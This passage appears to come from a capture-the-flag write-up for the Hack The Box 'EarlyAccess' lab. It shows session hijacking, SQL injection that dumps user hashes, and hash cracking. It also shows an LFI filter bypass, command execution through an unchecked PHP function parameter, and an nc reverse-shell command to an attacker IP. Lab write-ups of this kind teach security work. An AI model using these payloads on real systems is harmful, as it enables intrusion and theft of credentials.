/?XSRF-TOKEN=eyJpdiI6IkVEU0gwZHdrWGtOVWJVTkl1eVg2eXc9PSIsInZhbHVlIjoiU1hOdXlNSVZvM0dkMkdvd0JMMUxTNVU2WHB1MWQxREJXSlFFbDcxR3hrUmpuQ0drN3h5SjNSUi9tZWZ4b25qSUxzZmNlTnUxMEd6OEhqdG5CMEhvZzhxSjRRWjhwOXhzMWoxSWJ2UFRtVUwvN1NOMk1FMkVFSnpiNjdBTTUxd0MiLCJtYWMiOiJhMTdhOWUxYmU2ZTVjY2VmODIyNjI0ZjNjOTM4ZTdlNDkxNjkyZWM3NGYyODk2NWFiMzgyZjUyOWIxZmNjM2U4In0%3D;%20earlyaccess_session=eyJpdiI6Ikpza3pGZHRqTUpkVUxYMnNJdURRalE9PSIsInZhbHVlIjoiclRVTHVFNmVUWGt1NDVDWUZ6dGxqbUFSYkYwYWc1YW00eHdtZjNJZUxwUWxnSkFtbThyMEV6OXZoK3VsR0RWWGJucVN3YmpOSm94WUdNOVFicC9WMTRubS9qQzlqSlV6NHJ3WE0wZzlXanZzM2JrWjVJY2wyVmloSHl2eFJSa0kiLCJtYWMiOiJjYjY3MGE0ZjExYjM2YTI5Mzg3ZWNmY2JlZWE4MTAwYzg1NGQ1OTA0MmUzYTMwNzljYTFmYzgxNGQyMjYwNGNhIn0%3D HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">-</span>
</span></span></code></pre></div><p>If we change our <code>earlyaccess_session</code> to the one we retrieved,
we are now logged in as admin.</p><p>In the admin page you can download a backup of the key validator. There
are also two subdomains: <code>dev</code> and <code>game</code>.</p><p>If we look into the key validator code, we see the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span>magic_num <span style="color:#f92672">=</span> <span style="color:#ae81ff">346</span> <span style="color:#75715e"># TODO: Sync with API (api generates magic_num every 30min)</span>
</span></span></code></pre></div><p>So keys are validated using a magic number which is given by the server.
I’ve tried to get it from <a href="https://earlyaccess.htb/key/magic_num">https://earlyaccess.htb/key/magic_num</a>, but
that is not the endpoint. So we will have to fuzz it.</p><p>Let’s implement first the key generator. After some time reading the code, the key is divided in 4 parts and a checksum. Most of the parts can be fixed, so we have to generate keys in the form of:</p><pre tabindex="0"><code>KEY98-AZAZ2-XP???-GAML8-...
</code></pre><p>Where the <code>???</code> part may be any combination of 2 letters and 1 number which follow the <code>g3</code> expression, which uses the magic number. I used the following to generate it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_g3</span>(magic_num) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> letters:
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> letters:
</span></span><span style="display:flex"><span>            <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits:
</span></span><span style="display:flex"><span>                s <span style="color:#f92672">=</span> sum(bytearray((<span style="color:#e6db74">&#39;XP&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([i,j,n]))<span style="color:#f92672">.</span>encode()))
</span></span><span style="display:flex"><span>                <span style="color:#66d9ef">if</span> s <span style="color:#f92672">==</span> magic_num:
</span></span><span style="display:flex"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;XP&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([i,j,n])
</span></span></code></pre></div><p>The last part is simply computed after generating all the previous parts. We will have to fuzz all the possible <code>magic_num</code> verifying the key in the <code>/key/verify</code> endpoint, as we can’t know this number.</p><p>Once we got a key for the game, we can now go back to our user account
and activate it. After this, we will be able to enter the game. In this
case, it is using php.</p><p>We can see the leaderboard they were talking about in the forums. And
yes, if we change our profile name to a single quote we get the following error in
the scoreboard:</p><pre tabindex="0"><code>Error
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;) ORDER BY scoreboard.score DESC LIMIT 11&#39; at line 1
</code></pre><p>According to the error given, we can’t replace the SQL request. But we can perform UNION SQL injection to get results:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="display:flex"><span><span style="color:#e6db74">&#39;) UNION SELECT * FROM scoreboard; --
</span></span></span></code></pre></div><p>We just need to show only the same number of columns in the table:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="display:flex"><span><span style="color:#e6db74">&#39;) UNION SELECT 1,2,3 FROM scoreboard; --
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Username</span>    <span style="color:#a6e22e">Score</span>   <span style="color:#a6e22e">Time</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">3</span>   <span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>Now that we know it works and it is a <code>MySQL</code> database, we can get the table names from the <code>information_schema</code> table.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="display:flex"><span><span style="color:#e6db74">&#39;) UNION SELECT 1, table_name, 1  FROM information_schema.tables; --
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Username</span>    <span style="color:#a6e22e">Score</span>   <span style="color:#a6e22e">Time</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">failed_logins</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">scoreboard</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">users</span>
</span></span></code></pre></div><p>We can now do the same with the columns of the table <code>users</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="display:flex"><span><span style="color:#e6db74">&#39;) UNION SELECT 1, column_name, 1  FROM information_schema.columns WHERE TABLE_NAME = &#39;</span>users<span style="color:#e6db74">&#39;; --
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Username</span>    <span style="color:#a6e22e">Score</span>   <span style="color:#a6e22e">Time</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">id</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">name</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">email</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">password</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">role</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">key</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">created_at</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">1</span>   <span style="color:#a6e22e">updated_at</span>
</span></span></code></pre></div><p>And simply dump the important fields:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="display:flex"><span><span style="color:#e6db74">&#39;) UNION SELECT email, role, password  FROM users; --
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Username</span>    <span style="color:#a6e22e">Score</span>   <span style="color:#a6e22e">Time</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">618292e936625</span><span style="color:#a6e22e">aca8df61d5fff5c06837c49e491</span>    <span style="color:#a6e22e">admin</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">earlyaccess</span>.<span style="color:#a6e22e">htb</span>   <span style="color:#a6e22e">admin</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">d997b2a79e4fc48183f59b2ce1cee9da18aa5476</span>    <span style="color:#a6e22e">chr0x6eos</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">earlyaccess</span>.<span style="color:#a6e22e">htb</span>   <span style="color:#a6e22e">user</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">584204</span><span style="color:#a6e22e">a0bbe5e392173d3dfdf63a322c83fe97cd</span>    <span style="color:#a6e22e">firefart</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">earlyaccess</span>.<span style="color:#a6e22e">htb</span>    <span style="color:#a6e22e">user</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">290516</span><span style="color:#a6e22e">b5f6ad161a86786178934ad5f933242361</span>    <span style="color:#a6e22e">farbs</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">earlyaccess</span>.<span style="color:#a6e22e">htb</span>   <span style="color:#a6e22e">user</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">4</span><span style="color:#a6e22e">c900fbf77c0222faddb3b648b876e32cb723a04</span>    <span style="color:#a6e22e">test</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">test</span>.<span style="color:#a6e22e">com</span>   <span style="color:#a6e22e">user</span>
</span></span></code></pre></div><p>And we dumped the users!</p><p>We can decode this hash using SHA1 type (code 100).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>hashcat hash.txt /usr/share/dict/rockyou.txt -D <span style="color:#ae81ff">1</span> -m <span style="color:#ae81ff">100</span>
</span></span></code></pre></div><p>The decrypted password <code>gameover</code>.</p><p>Now we can login to the page with <code>admin@earlyaccess.htb:gameover</code>
credentials. Also to the <code>dev</code> subdomain we couldn’t access before.</p><p>The hashing page looks useless, but the <em>File-Tools</em> one seems promising.
Although, there is no visible endpoint so we may have to look for it.</p><p>The hashing page sends a request to <code>/actions/hash.php</code>. So I guess it
will be in <code>/actions/file.php</code>? We can send the same request of
<em>Hash-Tools</em>, but to the <code>file.php</code> endpoint:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -X POST -v http://dev.earlyaccess.htb/actions/file.php <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#39;action=hash&amp;redirect=true&amp;password=test&amp;hash_function=md5&#39;</span>
</span></span></code></pre></div><p>And it works! Well… there is an error, but now we know there is an
endpoint there.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">ERROR</span><span style="color:#f92672">:&lt;</span><span style="color:#960050;background-color:#1e0010">/h1&gt;Please specify file!%</span>
</span></span></code></pre></div><p>We can try with POST parameters.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>wfuzz -w /usr/share/dirbuster/parameter-names.txt <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-u http://dev.earlyaccess.htb/actions/file.php --hc <span style="color:#ae81ff">404</span> --hh <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-b <span style="color:#e6db74">&#34;PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#34;action=file&amp;redirect=true&amp;FUZZ=test&#34;</span>
</span></span></code></pre></div><p>Although, I didn’t get any result. After some time I decided to try with
GET.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>wfuzz -w /usr/share/dirbuster/parameter-names.txt <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-u <span style="color:#e6db74">&#39;http://dev.earlyaccess.htb/actions/file.php?FUZZ=test&#39;</span> --hc <span style="color:#ae81ff">404</span> --hh <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-b <span style="color:#e6db74">&#34;PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8&#34;</span>
</span></span></code></pre></div><p>And we get a result!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">ID</span>           <span style="color:#a6e22e">Response</span>   <span style="color:#a6e22e">Lines</span>    <span style="color:#a6e22e">Word</span>       <span style="color:#a6e22e">Chars</span>       <span style="color:#a6e22e">Payload</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000001316</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">500</span>        <span style="color:#ae81ff">0</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">2</span> <span style="color:#a6e22e">W</span>        <span style="color:#ae81ff">32</span> <span style="color:#a6e22e">Ch</span>       <span style="color:#e6db74">&#34;filepath&#34;</span>
</span></span></code></pre></div><p>There is a filepath parameter. I thought it would be some file upload,
but it seems like it will be some LFI.</p><p>If we try to enter a filepath with <code>..</code>, we get an error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">ERROR</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">For</span> <span style="color:#a6e22e">security</span> <span style="color:#a6e22e">reasons</span>, <span style="color:#a6e22e">reading</span> <span style="color:#a6e22e">outside</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">current</span> <span style="color:#a6e22e">directory</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">prohibited</span><span style="color:#f92672">!</span>
</span></span></code></pre></div><p>I guess we can access the <code>hash.php</code> file. We cannot traverse the path,
but I will try to fuzz for some files or weird configs.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>wfuzz -w /usr/share/dirbuster/vulns/file_inclusion_linux.txt <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-u <span style="color:#e6db74">&#39;http://dev.earlyaccess.htb/actions/file.php?filepath=FUZZ&#39;</span> --hc <span style="color:#ae81ff">500</span> --hh <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-b <span style="color:#e6db74">&#34;PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8&#34;</span>
</span></span></code></pre></div><p>I got the following results:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">ID</span>           <span style="color:#a6e22e">Response</span>   <span style="color:#a6e22e">Lines</span>    <span style="color:#a6e22e">Word</span>       <span style="color:#a6e22e">Chars</span>       <span style="color:#a6e22e">Payload</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002179</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">463</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;\xampp\phpmyadmin\phpinfo.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002178</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">472</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;\xampp\phpmyadmin\config.inc.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002175</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">463</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;\xampp\phpMyAdmin\phpinfo.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002174</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">472</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;\xampp\phpMyAdmin\config.inc.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002192</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">406</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;config.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002221</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">412</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;users.db.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002210</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">409</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;install.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002198</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">412</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;database.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002199</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">394</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;db.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002195</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">400</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;data.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002190</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">418</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;config.inc.php&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">000002187</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">L</span>      <span style="color:#ae81ff">36</span> <span style="color:#a6e22e">W</span>       <span style="color:#ae81ff">409</span> <span style="color:#a6e22e">Ch</span>      <span style="color:#e6db74">&#34;_config.php&#34;</span>
</span></span></code></pre></div><p>But all are false positives. Well, at least we know the path has to end
in <code>.php</code>.</p><p>We can try other techniques to bypass the restrictions for LFI. There is
one that works:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">filepath</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">:</span><span style="color:#75715e">//filter/convert.base64-encode/resource=hash.php
</span></span></span></code></pre></div><p>If we look closer at the code:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="display:flex"><span><span style="color:#75715e">// DEVELOPER-NOTE: There has gotta be an easier way...
</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span><span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex"><span><span style="color:#75715e">// Use inputted hash_function to hash password
</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span>$hash <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$hash_function($password);
</span></span></code></pre></div><p>Hahaha that developer note. If we try to change the inputted
<code>hash_function</code>, we get an error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Only</span> <span style="color:#a6e22e">MD5</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">SHA1</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">currently</span> <span style="color:#a6e22e">supported</span><span style="color:#f92672">!</span>
</span></span></code></pre></div><p>If we keep reading the code, this appears:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="display:flex"><span><span style="color:#75715e">// Only allow custom hashes, if `debug` is set
</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>($_REQUEST[<span style="color:#e6db74">&#39;hash_function&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;md5&#34;</span> <span style="color:#f92672">&amp;&amp;</span> $_REQUEST[<span style="color:#e6db74">&#39;hash_function&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;sha1&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;debug&#39;</span>]))
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Only MD5 and SHA1 are currently supported!&#34;</span>);
</span></span></code></pre></div><p>Okay, so we can just set the debug parameter and run whatever function
we want? Seems promising.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -X POST -v http://dev.earlyaccess.htb/actions/hash.php <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#39;action=hash&amp;redirect=true&amp;password=test&amp;hash_function=asdf&amp;debug=true&#39;</span>
</span></span></code></pre></div><p>We will get the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Stack</span> <span style="color:#a6e22e">trace</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#960050;background-color:#1e0010">/www/earlyaccess.htb/dev/actions/hash.php(53): hash_pw(&#39;asdf&#39;, &#39;test&#39;)</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span> {<span style="color:#a6e22e">main</span>}
</span></span><span style="display:flex"><span>  <span style="color:#a6e22e">thrown</span> <span style="color:#66d9ef">in</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">/var/www/earlyaccess.htb/dev/actions/hash.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;</span>
</span></span></code></pre></div><p>So yeah, it is working that way.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -X POST -v http://dev.earlyaccess.htb/actions/hash.php -L <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#39;action=hash&amp;redirect=true&amp;password=whoami&amp;hash_function=system&amp;debug=true&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -X POST -v http://dev.earlyaccess.htb/actions/hash.php -L <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;Cookie: PHPSESSID=8baffcc3aa52dbc5d891e66f37d4f1c8&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex"><span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#39;action=hash&amp;redirect=true&amp;password=nc+10.10.14.81+6666+-e+/bin/bash&amp;hash_function=system&amp;debug=true&#39;</span>
